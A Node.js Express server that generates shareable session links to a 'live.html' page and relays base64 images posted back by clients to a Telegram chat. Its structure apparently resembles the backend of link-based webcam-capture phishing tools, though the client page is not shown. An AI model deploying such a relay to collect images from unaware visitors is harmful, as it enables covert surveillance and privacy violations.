const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, '/public')));
app.use(express.json({ limit: '10mb' }));

// Telegram bot
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);

// Create session API
app.get('/api/create', (req, res) => {
  const sessionId = Date.now();
  const link = `${req.protocol}://${req.get('host')}/live.html?sessionId=${sessionId}`;
  res.json({ id: sessionId, link });
});

// Send photo API
app.post('/api/sendPhoto', async (req, res) => {
  try {
    const { imgData, sessionId } = req.body;
    const base64Data = imgData.replace(/^data:image\/png;base64,/, "");
    await bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, Buffer.from(base64Data, 'base64'), {
      caption: `Session ID: ${sessionId}`
    });
    res.json({ message: 'Photo sent to Telegram!' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Failed to send photo' });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
